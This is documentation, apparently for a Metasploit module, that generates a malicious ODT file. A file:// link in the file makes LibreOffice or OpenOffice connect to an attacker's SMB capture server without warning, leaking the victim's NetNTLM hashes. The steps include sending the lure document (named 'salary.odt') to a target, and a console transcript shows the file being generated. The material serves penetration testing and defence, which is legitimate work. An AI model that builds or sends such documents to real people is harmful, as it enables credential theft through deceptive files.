BADODT Module creates an ODT file which includes a file:// link which points back to a listening SMB capture server.
This module has been tested on both LibreOffice 6.03 /Apache OpenOffice 4.1.5 and upon opening connects to the server
without providing any warning to the user. This allows an attacker the opportunity to potentially steal NetNTLM hashes.

## Vulnerable Application

LibreOffice 6.03 /Apache OpenOffice 4.1.5
https://www.libreoffice.org/download/download/
https://www.openoffice.org/download/

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/odt/badodt```
  4. Customise Options as required
  5. Do: ```run```
  6. A malicious document will then be generated.
  7. Configure auxiliary/server/capture/smb or similar to capture hashes.
  8. Send document to target and wait for them to open.

## Options

CREATOR - This option allows you to customise the document author for the new document.
This can be changed using set CREATOR New_User

FILENAME - This option allows you to customise the generated filename.
This can be changed using set FILENAME salary.odt

LISTENER - This option allows you to set the IP address of the SMB Listener that the .odt document points to
This can be changed using set LISTENER 192.168.1.25

## Scenarios

### Version of software and OS as applicable

  LibreOffice 6.03 /Apache OpenOffice 4.1.5 and any version of Microsoft Windows.

  ```
  Console output
  ```

  ```
  msf > use auxiliary/odt/badodt
  msf auxiliary(odt/badodt) > set FILENAME salary.odt
  FILENAME => salary.odt
  msf auxiliary(odt/badodt) > set LISTENER 192.168.1.25
  LISTENER => 192.168.1.25
  msf auxiliary(odt/badodt) > set CREATOR A_USER
  CREATOR => A_USER
  msf auxiliary(odt/badodt) > exploit

  [*] Generating Malicious ODT File 
  [*] SMB Listener Address will be set to 192.168.1.25
  [+] salary.odt stored at /root/.msf4/local/salary.odt
  [*] Auxiliary module execution completed
  msf auxiliary(odt/badodt) > 
  ```